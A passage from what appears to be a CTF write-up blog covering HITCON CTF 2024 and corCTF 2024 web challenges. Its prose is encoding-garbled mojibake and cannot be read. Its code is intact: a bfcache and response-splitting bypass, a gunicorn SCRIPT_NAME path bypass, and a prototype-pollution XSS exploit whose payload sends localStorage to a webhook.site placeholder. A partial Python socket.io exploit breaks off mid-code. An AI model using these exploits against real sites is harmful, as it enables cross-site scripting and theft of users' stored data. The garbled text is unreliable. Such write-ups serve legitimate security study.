æœ‰å‡ºç¾éï¼Œç°¡å–®ä¾†è¬›å‘¢ï¼Œæˆ‘å€‘å…ˆé€ è¨ª target.htmlï¼Œæ­¤æ™‚çš„ response æœƒæ˜¯ VIEWER_HTMLï¼Œè€Œåœ¨ VIEWER_HTML å…§æœƒåŸ·è¡Œ <code>fetch(&#39;target.html&#39;)</code> å»æŠŠå…§å®¹æŠ“å›ä¾†ï¼Œé€™æ™‚å€™ response å°±æœƒè¢«æ”¾åœ¨ cache ä¸­</p><p>å†ä¾†ï¼Œæˆ‘å€‘æŠŠåŒå€‹åˆ†é å°åˆ°è‡ªå·±çš„ originï¼Œæ¥è‘—åŸ·è¡Œ <code>history.go(-1)</code>ï¼ŒæŠŠ URL å°å›å» <code>target.html</code>ï¼Œæ­¤æ™‚å› ç‚º bfcache çš„é—œä¿‚ï¼Œå°±æœƒè¼‰å…¥ç”¨ <code>fetch(&#39;target.html&#39;)</code> æ‰€æŠ“å–çš„ HTMLï¼Œç¹éäº†åŸæœ¬çš„é™åˆ¶ï¼Œå¯ä»¥è¼‰å…¥ä»»æ„ HTMLã€‚</p><p>ä½†ä¸‹ä¸€å€‹å•é¡Œæ˜¯ CSPï¼š<code>default-src &#39;self&#39;;</code>ï¼Œå› æ­¤ script åªèƒ½è¼‰å…¥ same-origin çš„ï¼Œä½† proxy é‚£é‚Šæœ‰é™åˆ¶ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-type'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span>    req<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'sec-fetch-dest'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'content-length'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'0'</span>    <span class="token keyword">delete</span> res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'transfer-encoding'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœ content type åŒ…å« scriptï¼Œç›´æ¥æŠŠ content-length è®Šæˆ 0ï¼Œå› æ­¤æ²’è¾¦æ³•è¼‰å…¥ scriptã€‚</p><p>é€™æ™‚å€™å°±è¦ç”¨åˆ° response splitting äº†ï¼Œå› ç‚º proxy é‚£é‚Šæœƒç›´æ¥æŠŠæ”¶åˆ°çš„ response pipe å‡ºå»ï¼Œå› æ­¤å¯ä»¥æ§‹é€ å‡ºé€™æ¨£çš„æµç¨‹ï¼š</p><ol><li>åœ¨ browser é‚£ç«¯ç™¼å‡ºç¬¬ä¸€å€‹è«‹æ±‚ï¼Œå°±å«è«‹æ±‚ A å§</li><li>åœ¨è«‹æ±‚ A çš„ response ä¸­å…ˆè¼¸å‡º <code>expect: &#39;100-continue&#39;</code> headerï¼Œè®“ proxy server é‚£é‚ŠæŠŠ header è¼¸å‡ºï¼Œæ­¤æ™‚å°ç€è¦½å™¨ä¾†èªªç¬¬ä¸€å€‹è«‹æ±‚å·²ç¶“çµæŸï¼Œæ‹¿åˆ°äº† responseï¼Œ</li><li>browser ç™¼å‡ºç¬¬äºŒå€‹è«‹æ±‚ Bï¼Œå»¶ç”¨åŒä¸€å€‹ connection</li><li>é€™æ™‚è¼¸å‡ºè«‹æ±‚ B çš„ responseï¼ˆä½†æ˜¯å° proxy ä¾†èªªé‚„æ˜¯è«‹æ±‚ A çš„ responseï¼‰ï¼Œç¹é content type çš„é™åˆ¶ï¼Œå› ç‚º proxy èªç‚ºé€™æ˜¯ response content</li></ol><p>ç°¡å–®ä¾†è¬›å°±æ˜¯é¡ä¼¼ request smuggling é‚£æ¨£ï¼Œä¸éæ˜¯åéä¾†åšã€‚</p><p>é€™é‚Šçš„ç´°ç¯€æœ‰å…©å€‹ï¼š</p><ol><li>é€é Chrome å°åŒä¸€å€‹ domain æœ‰ 6 å€‹ concurrent çš„é™åˆ¶ï¼Œç¢ºä¿å…¶ä¸­å…©å€‹è«‹æ±‚æœƒç”¨åˆ°åŒä¸€å€‹ connection</li><li>Node.js server åœ¨æ”¶åˆ° <code>Expect: 100-continue</code> çš„æ™‚å€™ï¼Œæœƒå…ˆ flushï¼Œé€™ä¸€æ­¥æ˜¯å¿…è¦çš„ï¼Œè¦ç¹é Chrome çš„é™åˆ¶</li></ol><p>å¯ä»¥è¼‰å…¥ JS ä¹‹å¾Œï¼Œå°±å†ç”¨ä¸€æ¨£çš„æ–¹æ³•è¼‰å…¥ service workerï¼Œä¸¦ä¸”ç”¨ <code>Service-Worker-Allowed: /</code> header ä¾†æ“´å¤§ scopeï¼Œå¯ä»¥è¨»å†Šåˆ°æ•´å€‹ originã€‚</p><p>æ›´å¤šç´°ç¯€å¯ä»¥åƒè€ƒ maple çš„ writeup: <a href="https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B">https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B</a></p><h2><span id="corctf-2024">corCTF 2024</span></h2><h3><span id="webx2fcorctf-challenge-dev-17-solves">web&#x2F;corctf-challenge-dev - 17 solves</span></h3><p>Author: drakon</p><p>ä¸€å€‹è·Ÿ Chrome extension æœ‰é—œçš„é¡Œç›®ï¼Œä½†ä½œè€…å·²ç¶“å¯«å¾—å¾ˆè©³ç´°äº†ï¼Œå°±ä¸å¤šå¯«äº†ï¼š<a href="https://cor.team/posts/corctf-2024-corctf-challenge-dev/">corCTF 2024 - corctf-challenge-dev</a></p><h3><span id="webx2fiframe-note-2-solves">web&#x2F;iframe-note - 2 solves</span></h3><p>Author: sterllic</p><p>é€™é¡Œçš„æ ¸å¿ƒç¨‹å¼ç¢¼æ˜¯åº•ä¸‹é€™æ®µï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframe<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; url_for('static', filename='axios.min.js') &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&#123;&#123; url_for('static', filename='can.min.js') &#125;&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span> <span class="token string">"constructor"</span><span class="token punctuation">,</span> <span class="token string">"prototype"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">d</span> <span class="token operator">=></span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> qs <span class="token operator">=</span> can<span class="token punctuation">.</span><span class="token function">deparam</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>qs<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"no id provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/iframe/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>qs<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"no iframe found with that id!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"invalid url"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>name<span class="token punctuation">;</span>      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#iframe"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>url<span class="token punctuation">;</span>      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"#iframe"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>style<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾Œç«¯ç”¨ Flask + gunicorn æ¸²æŸ“å‡ºä¸Šé¢é€™å€‹ç¶²é ã€‚</p><p>can.js æœ‰å€‹ prototype pollution çš„æ¼æ´ï¼Œå°±ç®—æœ‰åšäº†æª¢æŸ¥é‚„æ˜¯å¯ä»¥ç”¨ URL encode ç¹éï¼Œä½†å•é¡Œæ˜¯æœ‰äº† pollution ä¹‹å¾Œå¯ä»¥å¹¹å˜›ã€‚</p><p>å‰ç«¯ä¹çœ‹ä¹‹ä¸‹å°±æ˜¯ <code>document.querySelector(&quot;#iframe&quot;).src = res.data.url</code> é€™æ®µæœ€å¯ç–‘äº†ï¼Œä½†æ˜¯é€™é‚Šéœ€è¦èƒ½æ§åˆ¶ server çš„ responseï¼Œä½†æ˜¯ server é‚£é‚Šæœ‰åšæª¢æŸ¥ï¼Œå› æ­¤ data.url åªèƒ½æ˜¯ http é–‹é ­ã€‚</p><p>æœ€å¾Œçš„è§£æ³•æ˜¯è·Ÿ axiosã€bfcache é‚„æœ‰ gunicorn çš„è¡Œç‚ºæœ‰é—œï¼Œgunicorn æœƒæ ¹æ“š header è£¡é¢çš„ <code>script_name</code> ä¾†æ±ºå®šæœ€å¾Œçš„ pathï¼Œä»¥ <a href="https://github.com/benoitc/gunicorn/issues/2650">Gunicornâ€™s handling of PATH_INFO and SCRIPT_NAME can lead to security issues when placed behind a proxy #2650</a> è£¡é¢çµ¦çš„ç¯„ä¾‹ä¾†èªªï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>URL<span class="token operator">+</span><span class="token string">'/REMOVED/admin/something/bad'</span><span class="token punctuation">,</span>             headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'script_name'</span><span class="token punctuation">:</span><span class="token string">'REMOVED/'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¦‚æœå‰é¢æœ‰å€‹ nginx æŠŠæ‰€æœ‰ &#x2F;admin é–‹é ­çš„è«‹æ±‚éƒ½æ“‹æ‰ï¼Œé€™æ™‚æˆ‘å€‘å¯ä»¥ç™¼é€ä¸€å€‹ &#x2F;REMOVED&#x2F;admin çš„è«‹æ±‚å†æ­é… script_name æ˜¯ REMOVED&#x2F;ï¼Œnginx æœƒé€šéï¼Œä½†æ˜¯åˆ° gunicorn çš„æ™‚å€™å°±æœƒæŠŠ path è§£æç‚º &#x2F;adminï¼Œç›´æ¥ç¹éäº†å‰é¢çš„ nginx æª¢æŸ¥ã€‚</p><p>è€Œé€™é¡Œæœƒç”¨åˆ°é€™å€‹è¡Œç‚ºçš„åœ°æ–¹åœ¨ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;script src&#x3D;&quot;&#123;&#123; url_for(&#39;static&#39;, filename&#x3D;&#39;axios.min.js&#39;) &#125;&#125;&quot;&gt;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä½ åŸ·è¡Œ <code>curl https://iframe-note.be.ax////example.com/view -H &quot;SCRIPT_NAME: //example.com</code>ï¼Œé‚£æœ€å¾Œ path æ˜¯ &#x2F;viewï¼Œä½†æ˜¯ base URL æœƒè®Šï¼Œæ¸²æŸ“çš„çµæœæ˜¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//example.com/static/axios.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°±èƒ½å¤ ç›´æ¥æ§åˆ¶é é¢ä¸Šçš„ srcã€‚</p><p>ä½œè€…å¯èƒ½æ‡¶å¾—å¼„ä¸€å€‹ instance ä¾† host payloadï¼Œå› æ­¤ç›´æ¥ç”¨äº† data URIï¼ŒæŠŠ script è®Šæˆ <code>&lt;script src=&quot;data:text/javascript,&#123;XSS&#125;&quot;&gt;</code></p><p>å› ç‚ºè¦é”æˆé€™å€‹çµæœéœ€è¦åœ¨è«‹æ±‚ä¸­å‚³é€ headerï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° bfcacheï¼Œæµç¨‹æ˜¯ï¼š</p><ol><li>å…ˆé€ è¨ªæœ€å¾Œéœ€è¦çš„ URL</li><li>è·³è½‰åˆ° view é é¢ï¼Œåˆ©ç”¨ prototype pollution è®“ fetch é€å‡ºæœ‰ header çš„è«‹æ±‚</li><li>å›åˆ°ä¸Šä¸€é ï¼Œæ­¤æ™‚å› ç‚º bfcacheï¼Œæœƒæ²¿ç”¨å‰›å‰› fetch çš„ responseï¼Œå°±æ˜¯æœ‰ header çš„ç‰ˆæœ¬</li><li>XSS</li></ol><p>ä½œè€…çš„ exploitï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token comment">// const BASE_URL = "http://localhost:3000";</span>    <span class="token keyword">const</span> <span class="token constant">BASE_URL</span> <span class="token operator">=</span> <span class="token string">"https://iframe-note.be.ax"</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token constant">HOOK_URL</span> <span class="token operator">=</span> <span class="token string">"https://webhook.site/xxxxx"</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token function-variable function">main</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> dataUrl <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">data:text/javascript,navigator.sendBeacon('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">HOOK_URL</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">',JSON.stringify(localStorage))</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>      <span class="token keyword">const</span> win <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE_URL</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>dataUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/iframe/view</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      win<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">BASE_URL</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/view?id=view&amp;__%70roto__[headers][SCRIPT_NAME]=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>dataUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/iframe&amp;__%70roto__[baseURL]=/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>dataUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      win<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>origin<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/back.html?n=2</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">const</span> n <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  history<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token operator">-</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="corchat-x-1-solve">corchat x - 1 solve</span></h3><p>Author: larry</p><p>è·Ÿ socket.io æœ‰é—œçš„é¡Œç›®ï¼Œé‡é»çœ‹èµ·ä¾†æ˜¯ä¸‰å€‹ï¼š</p><ol><li>å¯ä»¥é€å‡º disconnect äº‹ä»¶ä½†æ˜¯æ²’æœ‰ disconnect</li><li>sokcet.io çš„ JSONP å¯ä»¥æ‹¿ä¾† bypass CSP</li><li>ç”¨ performance API åˆ—å‡ºæ›¾ç¶“è¼‰å…¥éçš„è³‡æº</li></ol><p>åº•ä¸‹é™„ä¸Š Discord ä¸­ EhhThing è²¼çš„ exploitï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socketio<span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> jsonbase_url <span class="token operator">=</span> <span class="token string">'https://corchat-x-a6e1f8c45d3ca520.be.ax'</span><span class="token keyword">def</span> <span class="token function">create_sid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    login <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/'</span></span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> login<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">,</span> login<span class="token punctuation">.</span>status_code    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/socket.io/'</span></span><span class="token punctuation">,</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'EIO'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token string">'transport'</span><span class="token punctuation">:</span> <span class="token string">'polling'</span><span class="token punctuation">,</span>        <span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token string">'bingus'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>status_code    socket_session <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'fake session'</span><span class="token punctuation">,</span> socket_session<span class="token punctuation">)</span>    res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/socket.io/'</span></span><span class="token punctuation">,</span> params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'EIO'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token string">'transport'</span><span class="token punctuation">:</span> <span class="token string">'polling'</span><span class="token punctuation">,</span>        <span class="token string">'t'</span><span class="token punctuation">:</span> <span class="token string">'P3qHGUZ'</span><span class="token punctuation">,</span>        <span class="token string">'sid'</span><span class="token punctuation">:</span> socket_session<span class="token punctuation">[</span><span class="token string">'sid'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token string">b'40'</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>status_code    <span class="token keyword">return</span> socket_session<span class="token punctuation">[</span><span class="token string">'sid'</span><span class="token punctuation">]</span>bot_session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>login <span class="token operator">=</span> bot_session<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_url<span class="token punctuation">&#125;</span></span><span class="token string">/'</span></span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'FizzBuzz101'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">assert</span> login<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">,</span> login<span class="token punctuation">.</span>status_codesio <span class="token operator">=</span> socketio<span class="token punctuation">.</span>Client<span class="token punctuation">(</span>http_session<span class="token operator">=</span>bot_session<span class="token punctuation">)</span>ready <span class="token operator">=</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@sio<span class="token punctuation">.</span>event</span><span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> ready    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'connected!'</span><span class="token punctuation">)</span>    <span class="token comment"># fake disconnect event so that the bot can connect as well</span>    sio<span class="token punctuation">.</span>emit<span class="token punctuation">(</span><span class="token string">'disconnect'</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    ready <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ready for bot!'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@sio<span class="token punctuation">.</span>event</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> ready    <span class="token keyword">if</span> <span class="token keyword">not</span> ready<span class="token 